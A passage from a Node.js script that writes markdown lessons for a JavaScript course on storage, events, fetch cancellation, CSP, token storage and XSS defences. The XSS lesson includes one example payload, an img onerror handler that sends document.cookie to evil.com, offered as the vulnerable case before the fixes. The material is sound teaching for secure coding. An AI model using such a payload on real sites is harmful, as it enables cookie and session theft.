- Sent with every HTTP request (use for auth tokens)
- ~4KB limit
- HttpOnly cookies cannot be read by JS — safer for sensitive data

## Comparison

| | LocalStorage | SessionStorage | IndexedDB | Cookie |
|---|---|---|---|---|
| Capacity | ~5MB | ~5MB | 50MB+ | ~4KB |
| Persistence | Until cleared | Tab close | Until cleared | Expiry date |
| Sent to server | ❌ | ❌ | ❌ | ✅ |
| Accessible in JS | ✅ | ✅ | ✅ | ✅ (if not HttpOnly) |
| Async | ❌ | ❌ | ✅ | ❌ |

> ⚠️ **Warning:** Never store JWT access tokens in LocalStorage — XSS can steal them. Use HttpOnly cookies for auth tokens. Use LocalStorage only for non-sensitive UI preferences.
`);

write('js-events', `---
title: "Event Architecture"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-events"
description: "Bubbling, capturing, and scaling with Event Delegation."
---

# Event Architecture

## Event Propagation — 3 phases

1. **Capture phase** — event travels down from document to target
2. **Target phase** — event reaches the target element
3. **Bubble phase** — event travels back up to document (default)

\`\`\`js
// Bubble phase (default: useCapture = false)
element.addEventListener('click', handler);

// Capture phase
element.addEventListener('click', handler, true);
// or
element.addEventListener('click', handler, { capture: true });
\`\`\`

## Stopping propagation

\`\`\`js
element.addEventListener('click', (e) => {
  e.stopPropagation();  // stop bubbling up
  e.preventDefault();   // stop default browser behavior (links, form submit)
});
\`\`\`

## Event Delegation — one listener for many elements

Instead of attaching listeners to every child, attach one to the parent and check the target.

\`\`\`js
// ❌ Inefficient — 1000 listeners for 1000 rows
rows.forEach(row => row.addEventListener('click', handleClick));

// ✅ Event delegation — 1 listener, works for dynamically added rows too
table.addEventListener('click', (e) => {
  const row = e.target.closest('tr');
  if (!row) return;
  handleRowClick(row);
});
\`\`\`

## Custom events

\`\`\`js
// Dispatch
const event = new CustomEvent('order:placed', {
  detail: { orderId: 123, total: 99.99 },
  bubbles: true,
});
document.dispatchEvent(event);

// Listen
document.addEventListener('order:placed', (e) => {
  console.log(e.detail.orderId); // 123
});
\`\`\`

> ⚠️ **Warning:** Event delegation breaks with \`stopPropagation\`. If a child element stops propagation, the delegated listener on the parent never fires.
`);

write('js-fetch-abort', `---
title: "Fetch & AbortController"
category: "javascript"
chapterId: "js-browser-apis"
slug: "js-fetch-abort"
description: "Resilient data fetching, timeouts, cancellation, and WebSockets."
---

# Fetch & AbortController

## Basic Fetch

\`\`\`js
const res = await fetch('/api/users');
if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
const users = await res.json();
\`\`\`

## AbortController — cancel a request

\`\`\`js
const controller = new AbortController();

// Cancel after 5s timeout
const timeout = setTimeout(() => controller.abort(), 5000);

try {
  const res = await fetch('/api/data', { signal: controller.signal });
  const data = await res.json();
  clearTimeout(timeout);
  return data;
} catch (err) {
  if (err.name === 'AbortError') console.log('Request was cancelled');
  else throw err;
}
\`\`\`

## Cancel on component unmount (React)

\`\`\`js
useEffect(() => {
  const controller = new AbortController();

  fetch('/api/data', { signal: controller.signal })
    .then(r => r.json())
    .then(setData)
    .catch(err => { if (err.name !== 'AbortError') setError(err); });

  return () => controller.abort(); // cancel on unmount
}, []);
\`\`\`

## WebSockets — persistent bidirectional connection

\`\`\`js
const ws = new WebSocket('wss://api.example.com/live');

ws.onopen    = () => ws.send(JSON.stringify({ type: 'subscribe', channel: 'prices' }));
ws.onmessage = (e) => console.log('Received:', JSON.parse(e.data));
ws.onerror   = (e) => console.error('WS error:', e);
ws.onclose   = () => console.log('Disconnected');

// Send data
ws.send(JSON.stringify({ type: 'ping' }));

// Close cleanly
ws.close();
\`\`\`

> ⚠️ **Warning:** Always cancel in-flight fetch requests when the user navigates away or a new search starts. Without AbortController, stale responses can overwrite fresh data (race condition).
`);

// ─── Ch11: Security ───────────────────────────────────────────────────────────

write('js-csp', `---
title: "Content Security Policy (CSP)"
category: "javascript"
chapterId: "js-security"
slug: "js-csp"
description: "Fine-tuning CSP headers to mitigate injection attacks."
---

# Content Security Policy (CSP)

## What is it?

CSP is an HTTP response header that tells the browser **which sources are allowed to load scripts, styles, images, and other resources**. It's your primary defense against XSS — even if an attacker injects a script tag, the browser won't execute it if the source isn't whitelisted.

## How to use it

\`\`\`http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'none';
\`\`\`

## Key directives

| Directive | Controls |
|---|---|
| \`default-src\` | Fallback for all resource types |
| \`script-src\` | JavaScript sources |
| \`style-src\` | CSS sources |
| \`img-src\` | Image sources |
| \`connect-src\` | XHR, fetch, WebSocket |
| \`frame-src\` | iframes |

## Common values

| Value | Meaning |
|---|---|
| \`'self'\` | Same origin only |
| \`'none'\` | Nothing allowed |
| \`'unsafe-inline'\` | Inline scripts/styles allowed (weakens CSP) |
| \`'nonce-{value}'\` | Allow specific inline scripts with matching nonce |
| \`https://cdn.example.com\` | Specific external domain |

## Nonce-based CSP (best practice for inline scripts)

\`\`\`html
<!-- Server generates a random nonce per request -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-abc123'" />

<!-- Only this inline script is allowed -->
<script nonce="abc123">
  console.log('trusted');
</script>
\`\`\`

## Report-only mode (testing)

\`\`\`http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
\`\`\`

> ⚠️ **Warning:** \`'unsafe-inline'\` and \`'unsafe-eval'\` defeat most of CSP's protection. Avoid them. Use nonces or hashes for legitimate inline scripts.
`);

write('js-token-security', `---
title: "Secure Token Management"
category: "javascript"
chapterId: "js-security"
slug: "js-token-security"
description: "Access/refresh tokens — HttpOnly cookies vs LocalStorage risks."
---

# Secure Token Management

## What is it?

Where you store auth tokens determines your attack surface. The two main options are **LocalStorage** (accessible to JS) and **HttpOnly cookies** (not accessible to JS).

## The attack vectors

### XSS (Cross-Site Scripting)
Attacker injects JS that reads \`localStorage.getItem('token')\`.

### CSRF (Cross-Site Request Forgery)
Malicious site tricks the browser into sending a request with the user's cookies.

## Comparison

| | LocalStorage | HttpOnly Cookie |
|---|---|---|
| Readable by JS | ✅ Yes | ❌ No |
| Sent automatically | ❌ No | ✅ Yes |
| XSS risk | ❌ High | ✅ Low |
| CSRF risk | ✅ Low | ❌ Needs protection |

## Recommended pattern

**Short-lived access token in memory** + **HttpOnly refresh token cookie**

\`\`\`js
// In-memory store — not persistent, gone on page refresh
let accessToken = null;

async function login(credentials) {
  const res = await fetch('/auth/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
    credentials: 'include', // send/receive cookies
  });
  const data = await res.json();
  accessToken = data.accessToken; // store in memory only
}

async function apiCall(url) {
  const res = await fetch(url, {
    headers: { Authorization: \`Bearer \${accessToken}\` },
    credentials: 'include',
  });
  if (res.status === 401) {
    await refreshToken(); // use HttpOnly cookie to get new access token
  }
  return res.json();
}

async function refreshToken() {
  const res = await fetch('/auth/refresh', {
    method: 'POST',
    credentials: 'include', // HttpOnly cookie sent automatically
  });
  const data = await res.json();
  accessToken = data.accessToken;
}
\`\`\`

## CSRF protection for cookies

\`\`\`http
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
\`\`\`

\`SameSite=Strict\` prevents the cookie from being sent on cross-site requests — defeating CSRF.

> ⚠️ **Warning:** Never store tokens in LocalStorage for sensitive apps. In-memory access tokens are lost on refresh — that's intentional. The HttpOnly refresh cookie silently re-issues them.
`);

write('js-xss-sanitization', `---
title: "Input Sanitization & XSS"
category: "javascript"
chapterId: "js-security"
slug: "js-xss-sanitization"
description: "Sanitizing user inputs to counter modern XSS bypass vectors."
---

# Input Sanitization & XSS

## What is XSS?

Cross-Site Scripting (XSS) — an attacker injects malicious scripts into your page that execute in other users' browsers. They can steal cookies, tokens, keystrokes, or redirect users.

## Three types

| Type | How it works |
|---|---|
| **Stored** | Payload saved in DB, rendered for every visitor |
| **Reflected** | Payload in URL query param, reflected in page HTML |
| **DOM-based** | Payload processed by client-side JS (e.g., \`innerHTML\`) |

## The root cause

\`\`\`js
// ❌ Vulnerable — inserting unsanitized user input into DOM
const comment = '<img src=x onerror="document.location=\'https://evil.com?c=\'+document.cookie">';
document.getElementById('output').innerHTML = comment; // executes!
\`\`\`

## Fix 1 — use textContent instead of innerHTML

\`\`\`js
// ✅ textContent escapes HTML — no execution possible
element.textContent = userInput;
\`\`\`

## Fix 2 — sanitize before inserting HTML (when you need formatting)

\`\`\`js
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});

element.innerHTML = clean; // safe
\`\`\`

## Fix 3 — never trust URL params in JS

\`\`\`js
// ❌ Vulnerable
const name = new URLSearchParams(location.search).get('name');
document.write(\`Welcome \${name}\`); // XSS if name = '<script>...'

// ✅ Safe
document.getElementById('greeting').textContent = \`Welcome \${name}\`;
\`\`\`

## Fix 4 — output encoding on the server

In server-rendered HTML, escape \`<\`, \`>\`, \`&\`, \`"\`, \`'\` before inserting user data.

## Checklist

- ✅ Use \`textContent\` or \`createElement\` over \`innerHTML\`
- ✅ Sanitize with DOMPurify if you must render user HTML
- ✅ Set a strict CSP header
- ✅ Use framework defaults (React escapes by default)
- ✅ Validate and encode on the server before storing
- ✅ Never use \`eval()\`, \`Function()\`, or \`setTimeout('string')\`

> ⚠️ **Warning:** React's JSX escapes values automatically — but \`dangerouslySetInnerHTML\` bypasses this. Always sanitize content passed to \`dangerouslySetInnerHTML\`.
`);

console.log('\n✅ All JS content files written!');
